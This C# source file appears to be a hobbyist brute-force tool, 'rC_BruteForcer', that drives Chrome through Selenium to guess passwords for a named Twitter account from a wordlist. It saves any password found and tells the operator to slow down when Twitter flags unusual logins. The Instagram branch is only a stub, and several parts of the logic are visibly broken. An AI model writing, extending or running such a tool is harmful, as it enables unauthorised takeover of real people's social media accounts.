using System;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System.IO;
using System.Collections.Generic;
namespace rC_BruteForcer
{
    class Program
    {
        static void Main(string[] args)
        {
            //rodrigo_cvg /home/rodrigo/wordlist.txt instagram 5
            string username = args[0];
            string wordlist = args[1];
            string platform = args[2];
            int threads = Convert.ToInt32(args[3]);
            StreamReader lread = File.OpenText(wordlist);
            string reader = "";
            List<string> l = new List<string>();
            while((reader=lread.ReadLine())!=null)
            {
                l.Add(reader);
            }
            lread.Close();
            if(platform == "instagram")
            {
                Instagram(username,l);
            }
            else if(platform == "twitter")
            {
                Twitter(username,l);
            }
            void Instagram(string user, List<string> list)
            {
                ChromeDriver driver = new ChromeDriver();
                driver.Navigate().GoToUrl("https://www.instagram.com");
            }
            void Twitter(string user, List<string> list)
            {
                ChromeDriver driver = new ChromeDriver();
                driver.Navigate().GoToUrl("https://twitter.com/login");
                Console.Clear();
                for(int i = 0;i<threads;i++)
                {
                    List<string> tried = new List<string>();
                    try{
                    StreamReader reader = File.OpenText("twitter_tried.txt");   
                    string readTried ="";
                    while((readTried=reader.ReadLine())!=null)
                    {
                        tried.Add(readTried);
                    }
                    reader.Close();
                    }
                    catch
                    {
                        
                    }
                    if(tried.Contains(list[i])==false)
                    {
                        driver.Navigate().GoToUrl("https://twitter.com/login");
                        System.Threading.Thread.Sleep(2*1000);
                        var userInput = driver.FindElementByName("session[username_or_email]");
                        var passwordInput = driver.FindElementByName("session[password]");
                        userInput.SendKeys(user);
                        passwordInput.SendKeys(list[i] + Keys.Enter);
                        StreamWriter writer = File.AppendText("twitter_tried.txt");
                        writer.WriteLine(list[i]);
                        Console.WriteLine($"Trying password: {list[i]} ({i}/{list.Count})");
                        writer.Close();
                    }

                    string textToLogin = "";
                    try
                    {
                        textToLogin = driver.FindElementByXPath("//*[@id=\"react-root\"]/div/div/div[2]/main/div/div/div[1]/span").Text;
                    }
                    catch
                    {

                    }
                    if(driver.PageSource=="https://www.twitter.com/home")
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.Write($"\nPassword Found: ");
                        StreamWriter writer = File.AppendText("Twitter_Found.txt");
                        writer.WriteLine(username+ ":" + " " + list[i]);
                        writer.Close();
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.Write(list[i]);
                    }else if(textToLogin.Contains("unusual login"))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("FATAL: Unusual Login Attempt detected, try again in some time with less threads.");
                        Console.ForegroundColor = ConsoleColor.White;
                    }
                }
            }
        }
    }
}
